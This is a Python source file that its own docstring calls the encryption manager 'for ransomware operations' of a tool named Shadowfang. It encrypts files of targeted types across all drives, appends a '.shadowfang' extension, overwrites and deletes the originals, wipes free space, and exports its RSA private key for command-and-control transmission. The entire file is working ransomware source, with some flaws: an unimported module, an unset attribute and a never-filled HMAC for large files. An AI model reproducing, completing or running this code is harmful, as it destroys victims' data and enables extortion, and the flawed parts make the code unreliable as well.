#!/usr/bin/env python3
"""
SHADOWFANG CORE - CRYPTO.PY
Military-grade encryption engine
AES-256-CBC for file encryption + RSA-2048 for key exchange
"""

import os
import sys
import time
import base64
import hashlib
import threading
from datetime import datetime
from core import CoreUtils, Constants, logger, WinAPI

# ==================== CRYPTOGRAPHIC IMPORTS ====================

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as sym_padding
    from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives import hmac
    from cryptography.hazmat.primitives import key_derivation
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    logger.warning("Cryptography library not available - using fallback")

# ==================== ENCRYPTION ENGINE ====================

class EncryptionEngine:
    """AES-256 file encryption engine with hybrid RSA key exchange"""
    
    def __init__(self, encryption_key=None, iv=None):
        self.encryption_key = encryption_key or os.urandom(32)
        self.iv = iv or os.urandom(16)
        self.rsa_private_key = None
        self.rsa_public_key = None
        self.encrypted_files = []
        self.failed_files = []
        self.total_encrypted = 0
        self.total_failed = 0
        self.total_bytes_encrypted = 0
        self.encryption_start_time = None
        self.encryption_end_time = None
        self.is_encrypting = False
        self.stop_requested = False
        
        # Initialize RSA keys if available
        if CRYPTO_AVAILABLE:
            self._generate_rsa_keys()
    
    def _generate_rsa_keys(self):
        """Generate RSA keypair for key exchange"""
        try:
            self.rsa_private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=Constants.RSA_KEY_SIZE,
                backend=default_backend()
            )
            self.rsa_public_key = self.rsa_private_key.public_key()
            logger.info("RSA-2048 keypair generated")
            return True
        except Exception as e:
            logger.error(f"RSA key generation failed: {e}")
            return False
    
    def _pad_data(self, data):
        """Add PKCS7 padding"""
        padder = sym_padding.PKCS7(128).padder()
        return padder.update(data) + padder.finalize()
    
    def _unpad_data(self, padded_data):
        """Remove PKCS7 padding"""
        unpadder = sym_padding.PKCS7(128).unpadder()
        return unpadder.update(padded_data) + unpadder.finalize()
    
    def encrypt_bytes(self, data):
        """Encrypt raw bytes with AES-256-CBC"""
        try:
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(self.iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            
            padded_data = self._pad_data(data)
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            
            return encrypted_data
        except Exception as e:
            logger.error(f"Byte encryption failed: {e}")
            return None
    
    def decrypt_bytes(self, encrypted_data):
        """Decrypt raw bytes with AES-256-CBC"""
        try:
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(self.iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            
            decrypted_padded = decryptor.update(encrypted_data) + decryptor.finalize()
            decrypted_data = self._unpad_data(decrypted_padded)
            
            return decrypted_data
        except Exception as e:
            logger.error(f"Byte decryption failed: {e}")
            return None
    
    def encrypt_file(self, filepath, delete_original=True):
        """Encrypt single file with AES-256"""
        if self.stop_requested:
            return False
        
        try:
            # Validate file
            if not os.path.exists(filepath):
                return False
            
            # Check file size
            file_size = os.path.getsize(filepath)
            if file_size == 0:
                return False
            
            if file_size > Constants.CHUNK_SIZE * 100:
                # Large file - use chunked encryption
                return self._encrypt_large_file(filepath, delete_original)
            
            # Generate unique IV for each file
            file_iv = os.urandom(16)
            
            # Read file
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            # Create cipher with file-specific IV
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(file_iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            
            # Pad and encrypt
            padder = sym_padding.PKCS7(128).padder()
            padded_data = padder.update(file_data) + padder.finalize()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            
            # Calculate HMAC for integrity
            file_hmac = self._calculate_hmac(encrypted_data)
            
            # Write encrypted file
            encrypted_path = filepath + '.shadowfang'
            with open(encrypted_path, 'wb') as f:
                # Magic header
                f.write(b'SFANG1')
                # IV (16 bytes)
                f.write(file_iv)
                # HMAC (32 bytes)
                f.write(file_hmac)
                # Encrypted data
                f.write(encrypted_data)
            
            # Delete original if requested
            if delete_original:
                self._secure_delete(filepath)
            
            # Track encryption
            self.encrypted_files.append(filepath)
            self.total_encrypted += 1
            self.total_bytes_encrypted += file_size
            
            logger.info(f"Encrypted: {filepath} ({file_size} bytes)")
            return True
            
        except Exception as e:
            self.failed_files.append(filepath)
            self.total_failed += 1
            logger.error(f"Encryption failed for {filepath}: {e}")
            return False
    
    def _encrypt_large_file(self, filepath, delete_original=True):
        """Encrypt large file in chunks to avoid memory issues"""
        try:
            file_size = os.path.getsize(filepath)
            file_iv = os.urandom(16)
            
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(file_iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            
            encrypted_path = filepath + '.shadowfang'
            
            with open(filepath, 'rb') as src, open(encrypted_path, 'wb') as dst:
                # Write header
                dst.write(b'SFANG1')
                dst.write(file_iv)
                dst.write(b'\x00' * 32)  # HMAC placeholder
                
                while True:
                    chunk = src.read(Constants.CHUNK_SIZE)
                    if not chunk:
                        break
                    
                    # Pad last chunk
                    if len(chunk) < Constants.CHUNK_SIZE:
                        padder = sym_padding.PKCS7(128).padder()
                        chunk = padder.update(chunk) + padder.finalize()
                    
                    encrypted_chunk = encryptor.update(chunk)
                    dst.write(encrypted_chunk)
                
                # Finalize encryption
                final_chunk = encryptor.finalize()
                if final_chunk:
                    dst.write(final_chunk)
            
            if delete_original:
                self._secure_delete(filepath)
            
            self.encrypted_files.append(filepath)
            self.total_encrypted += 1
            self.total_bytes_encrypted += file_size
            
            logger.info(f"Encrypted (large): {filepath} ({file_size} bytes)")
            return True
            
        except Exception as e:
            logger.error(f"Large file encryption failed: {e}")
            return False
    
    def decrypt_file(self, encrypted_filepath, delete_encrypted=True):
        """Decrypt single encrypted file"""
        try:
            if not os.path.exists(encrypted_filepath):
                return False
            
            with open(encrypted_filepath, 'rb') as f:
                # Read header
                magic = f.read(6)
                if magic != b'SFANG1':
                    logger.error(f"Invalid file format: {encrypted_filepath}")
                    return False
                
                file_iv = f.read(16)
                file_hmac = f.read(32)
                encrypted_data = f.read()
            
            # Verify HMAC
            calculated_hmac = self._calculate_hmac(encrypted_data)
            if calculated_hmac != file_hmac:
                logger.error(f"HMAC verification failed: {encrypted_filepath}")
                return False
            
            # Decrypt
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(file_iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            
            decrypted_padded = decryptor.update(encrypted_data) + decryptor.finalize()
            decrypted_data = self._unpad_data(decrypted_padded)
            
            # Write decrypted file
            original_path = encrypted_filepath.replace('.shadowfang', '')
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            if delete_encrypted:
                os.remove(encrypted_filepath)
            
            logger.info(f"Decrypted: {original_path}")
            return True
            
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return False
    
    def _calculate_hmac(self, data):
        """Calculate HMAC-SHA256 for data integrity"""
        try:
            h = hmac.HMAC(self.encryption_key, hashes.SHA256(), backend=default_backend())
            h.update(data)
            return h.finalize()
        except:
            return hashlib.sha256(data).digest()
    
    def _secure_delete(self, filepath, passes=1):
        """Securely delete file by overwriting"""
        try:
            file_size = os.path.getsize(filepath)
            
            with open(filepath, 'wb') as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            
            os.remove(filepath)
            return True
        except:
            # Fallback to normal delete
            try:
                os.remove(filepath)
                return True
            except:
                return False
    
    def encrypt_directory(self, directory, extensions=None, recursive=True):
        """Encrypt all matching files in directory"""
        if not extensions:
            extensions = Constants.TARGET_EXTENSIONS
        
        encrypted_count = 0
        
        try:
            if recursive:
                for root, dirs, files in os.walk(directory):
                    # Skip system directories
                    if any(skip in root for skip in Constants.SKIP_DIRECTORIES):
                        continue
                    
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in extensions):
                            filepath = os.path.join(root, file)
                            if self.encrypt_file(filepath):
                                encrypted_count += 1
            else:
                for file in os.listdir(directory):
                    filepath = os.path.join(directory, file)
                    if os.path.isfile(filepath):
                        if any(file.lower().endswith(ext) for ext in extensions):
                            if self.encrypt_file(filepath):
                                encrypted_count += 1
            
            return encrypted_count
            
        except Exception as e:
            logger.error(f"Directory encryption failed: {e}")
            return encrypted_count
    
    def encrypt_all_drives(self, extensions=None, drives=None):
        """Encrypt files on all available drives"""
        self.encryption_start_time = datetime.now()
        self.is_encrypting = True
        
        if not drives:
            drives = WinAPI.get_logical_drives()
        
        total_encrypted = 0
        
        for drive in drives:
            if self.stop_requested:
                break
            
            try:
                drive_type = WinAPI.get_drive_type(drive)
                
                # Skip certain drive types
                if drive_type == Constants.DRIVE_CDROM:
                    continue
                
                if drive_type == Constants.DRIVE_REMOTE and not self.encrypt_network_drives:
                    continue
                
                count = self.encrypt_directory(drive, extensions)
                total_encrypted += count
                
                logger.info(f"Drive {drive}: {count} files encrypted")
                
            except Exception as e:
                logger.error(f"Drive encryption failed for {drive}: {e}")
                continue
        
        self.encryption_end_time = datetime.now()
        self.is_encrypting = False
        
        return total_encrypted
    
    def stop_encryption(self):
        """Request encryption stop"""
        self.stop_requested = True
        logger.info("Encryption stop requested")
    
    def get_encryption_stats(self):
        """Get encryption statistics"""
        duration = None
        if self.encryption_start_time and self.encryption_end_time:
            duration = (self.encryption_end_time - self.encryption_start_time).total_seconds()
        
        return {
            'total_encrypted': self.total_encrypted,
            'total_failed': self.total_failed,
            'total_bytes': self.total_bytes_encrypted,
            'duration_seconds': duration,
            'files_per_second': self.total_encrypted / duration if duration else 0,
            'bytes_per_second': self.total_bytes_encrypted / duration if duration else 0
        }
    
    def export_rsa_private_key(self):
        """Export RSA private key for C2 transmission"""
        try:
            if self.rsa_private_key:
                pem = self.rsa_private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                )
                return base64.b64encode(pem).decode()
        except Exception as e:
            logger.error(f"RSA key export failed: {e}")
        return None
    
    def encrypt_rsa_key(self, data):
        """Encrypt data with RSA public key"""
        try:
            if self.rsa_public_key:
                encrypted = self.rsa_public_key.encrypt(
                    data,
                    asym_padding.OAEP(
                        mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                return encrypted
        except Exception as e:
            logger.error(f"RSA encryption failed: {e}")
        return None
    
    def decrypt_rsa_key(self, encrypted_data):
        """Decrypt data with RSA private key"""
        try:
            if self.rsa_private_key:
                decrypted = self.rsa_private_key.decrypt(
                    encrypted_data,
                    asym_padding.OAEP(
                        mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                return decrypted
        except Exception as e:
            logger.error(f"RSA decryption failed: {e}")
        return None

# ==================== KEY DERIVATION ====================

class KeyDerivation:
    """Key derivation and management utilities"""
    
    @staticmethod
    def derive_key(password, salt=None, iterations=200000):
        """Derive encryption key from password using PBKDF2"""
        try:
            if not salt:
                salt = os.urandom(32)
            
            key = hashlib.pbkdf2_hmac(
                'sha256',
                password.encode() if isinstance(password, str) else password,
                salt,
                iterations,
                dklen=32
            )
            
            return key, salt
        except Exception as e:
            logger.error(f"Key derivation failed: {e}")
            return None, None
    
    @staticmethod
    def generate_random_key(size=32):
        """Generate cryptographically secure random key"""
        return os.urandom(size)
    
    @staticmethod
    def generate_iv(size=16):
        """Generate random initialization vector"""
        return os.urandom(size)
    
    @staticmethod
    def generate_salt(size=32):
        """Generate random salt"""
        return os.urandom(size)
    
    @staticmethod
    def hash_key(key):
        """Hash key for storage"""
        return hashlib.sha256(key).hexdigest()
    
    @staticmethod
    def split_key(key, parts=3, required=2):
        """Split key using Shamir's Secret Sharing (simplified)"""
        # Simple XOR-based split
        shares = []
        for i in range(parts - 1):
            share = os.urandom(len(key))
            shares.append(share)
        
        # Last share = key XOR all other shares
        last_share = key
        for share in shares:
            last_share = bytes(a ^ b for a, b in zip(last_share, share))
        shares.append(last_share)
        
        return shares

# ==================== FILE HASHING ====================

class FileHasher:
    """File hashing utilities for integrity verification"""
    
    @staticmethod
    def hash_file(filepath, algorithm='sha256'):
        """Calculate file hash"""
        try:
            hash_obj = hashlib.new(algorithm)
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    hash_obj.update(chunk)
            return hash_obj.hexdigest()
        except:
            return None
    
    @staticmethod
    def hash_bytes(data, algorithm='sha256'):
        """Calculate hash of bytes"""
        hash_obj = hashlib.new(algorithm)
        hash_obj.update(data)
        return hash_obj.hexdigest()
    
    @staticmethod
    def verify_file_integrity(filepath, expected_hash, algorithm='sha256'):
        """Verify file integrity"""
        actual_hash = FileHasher.hash_file(filepath, algorithm)
        return actual_hash == expected_hash

# ==================== SECURE DELETION ====================

class SecureDelete:
    """Secure file deletion utilities"""
    
    @staticmethod
    def overwrite_file(filepath, passes=1):
        """Overwrite file with random data"""
        try:
            file_size = os.path.getsize(filepath)
            with open(filepath, 'wb') as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            return True
        except:
            return False
    
    @staticmethod
    def delete_file(filepath, secure=False):
        """Delete file with optional secure deletion"""
        try:
            if secure:
                SecureDelete.overwrite_file(filepath)
            os.remove(filepath)
            return True
        except:
            return False
    
    @staticmethod
    def wipe_free_space(directory, passes=1):
        """Wipe free space in directory"""
        try:
            # Create temporary file to fill space
            temp_file = os.path.join(directory, '.wipe_temp')
            
            with open(temp_file, 'wb') as f:
                while True:
                    try:
                        f.write(os.urandom(1024 * 1024))  # 1MB chunks
                    except:
                        break
            
            os.remove(temp_file)
            return True
        except:
            return False

# ==================== ENCRYPTION MANAGER ====================

class EncryptionManager:
    """High-level encryption manager for ransomware operations"""
    
    def __init__(self):
        self.engine = EncryptionEngine()
        self.key_derivation = KeyDerivation()
        self.file_hasher = FileHasher()
        self.secure_delete = SecureDelete()
        self.encryption_thread = None
        self.is_running = False
    
    def start_encryption(self, drives=None, extensions=None):
        """Start encryption in background thread"""
        if self.is_running:
            return False
        
        self.is_running = True
        
        def encrypt_worker():
            try:
                total = self.engine.encrypt_all_drives(extensions, drives)
                logger.info(f"Encryption complete: {total} files encrypted")
            finally:
                self.is_running = False
        
        self.encryption_thread = threading.Thread(target=encrypt_worker)
        self.encryption_thread.daemon = True
        self.encryption_thread.start()
        
        return True
    
    def stop_encryption(self):
        """Stop encryption"""
        self.engine.stop_encryption()
        if self.encryption_thread and self.encryption_thread.is_alive():
            self.encryption_thread.join(timeout=5)
        self.is_running = False
    
    def get_progress(self):
        """Get encryption progress"""
        return self.engine.get_encryption_stats()
    
    def decrypt_file(self, filepath, key):
        """Decrypt single file with key"""
        decrypt_engine = EncryptionEngine(key)
        return decrypt_engine.decrypt_file(filepath)
    
    def decrypt_all(self, key):
        """Decrypt all encrypted files"""
        decrypt_engine = EncryptionEngine(key)
        decrypted_count = 0
        
        for drive in WinAPI.get_logical_drives():
            for root, dirs, files in os.walk(drive):
                for file in files:
                    if file.endswith('.shadowfang'):
                        filepath = os.path.join(root, file)
                        if decrypt_engine.decrypt_file(filepath):
                            decrypted_count += 1
        
        return decrypted_count

# ==================== SINGLETON INSTANCE ====================

crypto_manager = EncryptionManager()

# ==================== EXPORT ====================

__all__ = [
    'EncryptionEngine',
    'KeyDerivation',
    'FileHasher',
    'SecureDelete',
    'EncryptionManager',
    'crypto_manager'
]